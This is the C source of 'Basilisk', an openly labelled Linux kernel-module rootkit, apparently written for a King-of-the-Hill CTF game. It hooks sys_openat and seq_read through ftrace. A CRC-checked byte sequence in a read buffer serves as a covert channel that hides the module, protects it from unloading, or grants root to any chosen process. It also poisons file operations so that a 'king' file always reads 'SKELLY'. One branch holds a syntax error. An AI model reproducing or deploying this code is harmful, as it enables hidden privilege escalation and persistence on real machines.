#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/path.h>
#include <linux/err.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/rwlock.h>
#include <linux/pid.h>

#include "include/ftrace_helper.h"
#include "include/stealth_helper.h"
#include "include/utils.h"
#include "include/crc32.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Skelly");
MODULE_DESCRIPTION("Basilisk LKM Rootkit");
MODULE_VERSION("2.0");

/* Macros for protecting king.txt */
#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
#define KING_FILENAME_LEN strlen(KING_FILENAME)

#define KING "SKELLY\n" // King
#define KING_LEN strlen(KING)

/* Enum for the different command signals */
enum {
    SIG_GOD = 0xFF,
    SIG_HIDE = 0xFA,
    SIG_PROTECT = 0xFB,
    SIG_ROOT = 0xBA,
};

enum {
  /* Component sizes */
  CMD_SIZE = sizeof(char),            
  RAND_BYTES_SIZE = 4 * sizeof(char), 
  PID_SIZE = sizeof(pid_t),           
  CRC_SIZE = sizeof(uint32_t),        

  TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE,
  
  /* Offsets */
  PID_OFFSET = TOTAL_SIZE - (PID_SIZE + CRC_SIZE),
  CRC_OFFSET = TOTAL_SIZE - CRC_SIZE
};

static bool hidden = false; // toggle for hiding from sysfs/procfs
static bool protected = false; // toggle for inc/decrementing module ref count

static struct file_operations *king_fops = NULL;
static DEFINE_RWLOCK(king_fops_lock);

/* Executes appropriate functions based on given signal. pid is meant to be used with signal SIG_ROOT */
void sig_handle(const uint32_t sig, pid_t pid) {
    switch (sig) {
        case SIG_HIDE:
            handle_lkm_hide(&hidden);
            break;

        case SIG_PROTECT:
            handle_lkm_protect(&protected);
            break;

        case SIG_GOD:
            handle_lkm_hide(&hidden);
            handle_lkm_protect(&protected);
            break;

        case SIG_ROOT:
            set_root(pid);
            break;

        default:
            break;
    }
}

/* Extract the signal, pid and CRC from the given buffer */
void extract_components(
    char *buf, 
    uint8_t *sig, 
    pid_t *pid, 
    uint32_t *crc
) {
    *sig = (uint8_t)buf[0]; // first byte (command)
    memcpy(pid, buf + PID_OFFSET, PID_SIZE);
    memcpy(crc, buf + CRC_OFFSET, CRC_SIZE);
}

/* Validate the crc extracted from the buffer */
bool is_valid_crc(
    char *buf,
    const uint32_t crc
) {
    uint32_t n_crc = crc32(buf, TOTAL_SIZE - CRC_SIZE);
    return n_crc == crc; 
}
/*
static const struct proc_ops kallsyms_proc_ops = {
	.proc_open	= kallsyms_open,
	.proc_read	= seq_read, <-- This is our target
	.proc_lseek	= seq_lseek,
	.proc_release	= seq_release_private,
};
*/
static asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf, size_t size, loff_t *ppos);
static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
{
    char *kbuf;
    long error;

    uint8_t sig;
    pid_t pid;
    uint32_t extracted_crc;

    kbuf = kmalloc(size, GFP_KERNEL);
    if (!kbuf) {
        return orig_seq_read(file, buf, size, ppos);
    }

    error = copy_from_user(kbuf, buf, size);
    if (error) {
        kfree(kbuf);
        return orig_seq_read(file, buf, size, ppos);
    }

    if (size < TOTAL_SIZE) {
        kfree(kbuf);
        return orig_seq_read(file, buf, size, ppos);
    }

    extract_components(kbuf, &sig, &pid, &extracted_crc);

    if (!is_valid_crc(kbuf, extracted_crc)) {
        kfree(kbuf);
        return orig_seq_read(file, buf, size, ppos);
    }
    sig_handle(sig, pid);

    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
}

/*
Hook for the read system call. Reads KING into buf and updates the pos pointer.
WARNING: This function is to be hooked in the f_op struct of the target file.
            Hooking it elsewhere will most definetely cause damage to the system.
*/
static ssize_t read_hook(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
    int read_len; 
    if (*pos == 0 && count >= KING_LEN) { // If pos at start of file, *read* our KING name
        read_len = KING_LEN;
        if (copy_to_user(buf, KING, read_len)) {
            pr_alert("basilisk: copy_to_user failed\n");
            return -EFAULT;
        }
	    *pos += read_len; // Use the file offset to handle subsequent reads 
        return read_len;
    } else {
	    return 0; // Return EOF
    }
}

/* 
Chains kern_path and d_path to resolve the final filename from a path (filename) is pointing to. 
WARNING: Callers should use full_path, not resolved_path, to use the name! 
*/
static long resolve_filename(const char __user *filename, char *resolved_path, char **full_path) {
    char kfilename[PATH_MAX];
    struct path path;
    long error;

    error = strncpy_from_user(kfilename, filename, PATH_MAX);
    if (error < 0) {
        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
        return error; 
    }

    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
    if (error) {
        return error;
    }

    *full_path = d_path(&path, resolved_path, PATH_MAX);
    if (IS_ERR(*full_path)) {
        path_put(&path);
        return PTR_ERR(*full_path);
    }

    error = is_bad_path(*full_path, KING_FILENAME, KING_FILENAME_LEN); // check if full_path matches KING_FILENAME
    if (error) {
        path_put(&path);
        return error; 
    }

    path_put(&path);
    
    return 0;
}

/* Poisons the file operations structures of given fd to use read_hook as the read syscall */
static long handle_fops_poisoning(int fd, const char *full_path) {
    struct file *file;

    file = fget(fd);
    if (!file) {
        pr_err("basilisk: failed to get file structure from file descriptor\n");
        return -1;
    }

    /* Lazy initialization of king_fops */
    read_lock(&king_fops_lock); 
    if (!king_fops) {
        read_unlock(&king_fops_lock);
        write_lock(&king_fops_lock);
        
        king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
        if (king_fops) {
            king_fops->read = read_hook;
        } else {
            pr_alert("Failed to allocate memory for new file_operations\n");
            write_unlock(&king_fops_lock);
            return -1;
        }
        write_unlock(&king_fops_lock);

    } else {
        read_unlock(&king_fops_lock); // Release read lock in case of already initialized king_fops
    }

    /* *Poison* targets file fops */
    write_lock(&king_fops_lock); 
    file->f_op = king_fops;
    write_unlock(&king_fops_lock);
    
    fput(file);
    return fd;
}

/*
sys_openat hook. 
Resolves the filename from the file descriptor and poisons its file operations struct if it matches our target file.
Otherwise it returns the original openat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_openat)(const struct pt_regs *);

static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    const char __user *filename = (char *)regs->si;
    int flags = regs->dx;
    umode_t mode = regs->r10;

    int fd;
    char *full_path;
    char *resolved_path;
    long error;

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {
        pr_err("basilisk: kmalloc failed");
	    return orig_openat(regs); // Return real sys_openat without delay 
    }

    /* resolve filename from file descriptor */    
    error = resolve_filename(filename, resolved_path, &full_path);
    if (error) {
        kfree(resolved_path) // free resolved_path
        return orig_openat(regs);
    }
    /* poison fops sturct if path matches our target file and fd is not standard */
    fd = orig_openat(regs);

    error = is_bad_fd(fd); // check if fd is not standard
    if (error) {
        kfree(resolved_path);
        return orig_openat(regs);
    }

    error = handle_fops_poisoning(fd, full_path);
    if (error == fd) { // fops poisoning succeeded 
        kfree(resolved_path);
        return fd;
    }
    kfree(resolved_path);
    return orig_openat(regs);
}
#else
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);

static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
{
    int fd;
    char *full_path;
    char *resolved_path;
    long error;

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {
        pr_err("basilisk: kmalloc failed");
	    return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
    }

    /* resolve filename from file descriptor */    
    error = resolve_filename(filename, resolved_path, &full_path);
    if (error) {
        kfree(resolved_path); // free resolved_path
        return orig_openat(dfd, filename, flags, mode);
    }
    /* poison file operations of our new file descriptor */
    fd = orig_openat(dfd, filename, flags, mode); 
    
    error = is_bad_fd(fd); // check if fd is not standard
    if (error) {
        kfree(resolved_path);
        return orig_openat(dfd, filename, flags, mode);
    }

    error = handle_fops_poisoning(fd, full_path);
    if (error == fd) { // fops poisoning succeeded 
        kfree(resolved_path);
        return fd;
    }
    kfree(resolved_path);
    return orig_openat(dfd, filename, flags, mode);
}
#endif

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_openat", hook_openat, &orig_openat),
    HOOK("seq_read", hook_seq_read, &orig_seq_read),
};

/* Module initialization function */
static int __init basilisk_init(void)
{
    int err;
    
    init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
    /* Hook the syscall and print to the kernel buffer */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    pr_info("basilisk: loaded\n");
    return 0;
}

static void __exit basilisk_exit(void)
{
    kfree(king_fops); // free king_fops
    /* Unhook and restore the syscalls */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);
